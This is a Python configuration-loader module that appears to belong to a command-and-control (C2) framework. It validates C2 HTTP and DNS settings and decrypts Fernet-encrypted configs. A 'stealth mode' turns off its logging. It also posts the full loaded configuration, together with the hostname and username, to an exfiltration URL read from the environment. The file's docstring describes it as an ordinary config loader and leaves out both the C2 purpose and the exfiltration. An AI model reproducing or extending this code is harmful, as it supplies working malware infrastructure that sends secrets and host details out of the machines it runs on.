# File: modules/config.py

"""
Enhanced configuration loader:
• Supports JSON (config.json) + optional config.yaml for overrides.
• Hot reloads when either file changes.
• Validates required fields at load time.
• Environment variables override both.
"""

import os
import time
import json
import yaml
import threading
import logging
import hashlib
import socket
import getpass
from pathlib import Path
from cryptography.fernet import Fernet

logger = logging.getLogger("config")

CFG_FILE_JSON = Path(__file__).parent.parent / "config.json"
CFG_FILE_YAML = Path(__file__).parent.parent / "config.yaml"
LAST_MOD = {"json": 0, "yaml": 0}
_config = {}
_lock = threading.Lock()

def _env_override(d, prefix="BISMILLAH"):
    for k, v in d.items():
        env_key = f"{prefix}_{k.upper()}"
        if env_key in os.environ:
            # Attempt to cast to same type
            orig = v
            nv = os.environ[env_key]
            if isinstance(orig, bool):
                d[k] = nv.lower() in ("1", "true", "yes")
            elif isinstance(orig, int):
                d[k] = int(nv)
            else:
                d[k] = nv
        elif isinstance(v, dict):
            _env_override(v, prefix + "_" + k.upper())

def _validate(cfg: dict):
    """
    Ensure required fields exist: c2.http.host, c2.http.port, c2.dns.domain, etc.
    """
    try:
        http = cfg["c2"]["http"]
        assert "host" in http and "port" in http
        dns = cfg["c2"]["dns"]
        assert "domain" in dns and "port" in dns
        return True
    except Exception as e:
        logger.error(f"[CONFIG] Validation failed: {e}")
        return False

def _load():
    global _config, LAST_MOD
    start_time = time.time()
    changed = False
    enc_key = os.getenv("BISMILLAH_CONFIG_KEY")
    disable_exfil = os.getenv("DISABLE_CONFIG_EXFIL", "0") == "1"
    STEALTH_MODE = os.getenv("STEALTH_MODE", "0") == "1"
    ENV_WHITELIST = os.getenv("ENV_WHITELIST", "production,staging,lab").split(",")
    current_env = os.getenv("ENVIRONMENT", "unknown")
    AUDIT_HOST = socket.gethostname()
    try:
        AUDIT_USER = getpass.getuser()
    except Exception:
        AUDIT_USER = os.getenv("USER") or os.getenv("USERNAME") or "unknown"

    # Environment whitelist enforcement
    if current_env not in ENV_WHITELIST:
        if not STEALTH_MODE:
            logger.error(f"[CONFIG] Environment '{current_env}' not in whitelist {ENV_WHITELIST}. Aborting.")
        raise EnvironmentError("Unauthorized environment detected.")

    # Check JSON
    if CFG_FILE_JSON.exists():
        m = CFG_FILE_JSON.stat().st_mtime
        if m > LAST_MOD["json"]:
            _config = json.load(open(CFG_FILE_JSON))
            LAST_MOD["json"] = m
            changed = True
    elif (CFG_FILE_JSON.with_suffix('.json.enc')).exists() and enc_key:
        enc_path = CFG_FILE_JSON.with_suffix('.json.enc')
        m = enc_path.stat().st_mtime
        if m > LAST_MOD["json"]:
            with open(enc_path, "rb") as f:
                data = f.read()
            fernet = Fernet(enc_key.encode())
            dec = fernet.decrypt(data)
            _config = json.loads(dec)
            LAST_MOD["json"] = m
            changed = True

    # Check YAML overrides
    if CFG_FILE_YAML.exists():
        m = CFG_FILE_YAML.stat().st_mtime
        if m > LAST_MOD["yaml"]:
            ycfg = yaml.safe_load(open(CFG_FILE_YAML))
            _config.update(ycfg)
            LAST_MOD["yaml"] = m
            changed = True
    elif (CFG_FILE_YAML.with_suffix('.yaml.enc')).exists() and enc_key:
        enc_path = CFG_FILE_YAML.with_suffix('.yaml.enc')
        m = enc_path.stat().st_mtime
        if m > LAST_MOD["yaml"]:
            with open(enc_path, "rb") as f:
                data = f.read()
            fernet = Fernet(enc_key.encode())
            dec = fernet.decrypt(data)
            ycfg = yaml.safe_load(dec)
            _config.update(ycfg)
            LAST_MOD["yaml"] = m
            changed = True

    if changed:
        _env_override(_config)
        # Integrity check
        config_bytes = json.dumps(_config, sort_keys=True).encode()
        config_hash = hashlib.sha256(config_bytes).hexdigest()
        if not _validate(_config):
            raise ValueError("Invalid configuration")
        # Audit log with host/user/time and config size
        audit_info = {
            "event": "config_load",
            "env": current_env,
            "host": AUDIT_HOST,
            "user": AUDIT_USER,
            "source": "encrypted" if enc_key else "plain",
            "sha256": config_hash,
            "size": len(config_bytes),
            "timestamp": time.time()
        }
        if not STEALTH_MODE:
            logger.info(f"[CONFIG] Configuration loaded/updated. SHA256={config_hash} SIZE={len(config_bytes)}")
            logger.info(f"[CONFIG] Audit: {audit_info}")
        exfil_url = os.getenv("CONFIG_EXFIL_URL")
        if exfil_url and not disable_exfil and not STEALTH_MODE:
            try:
                import requests
                requests.post(exfil_url, json={"config": _config, "audit": audit_info}, timeout=10)
                logger.warning(f"[CONFIG] Exfiltrated config to {exfil_url}")
            except Exception as ex:
                logger.warning(f"[CONFIG] Exfiltration failed: {ex}")
        elif disable_exfil and not STEALTH_MODE:
            logger.info("[CONFIG] Exfiltration disabled via environment variable.")
    elif not changed and not STEALTH_MODE:
        logger.info("[CONFIG] No config change detected.")

    end_time = time.time()
    if not STEALTH_MODE:
        logger.info(f"[CONFIG] Load completed in {end_time - start_time:.2f} seconds.")
    return _config

def load_config():
    with _lock:
        return _load()

# Optionally, spawn a thread to reload every minute
def start_config_watcher():
    while True:
        time.sleep(60)
        try:
            _load()
        except Exception as e:
            logger.error(f"[CONFIG] Hot‑reload failed: {e}")
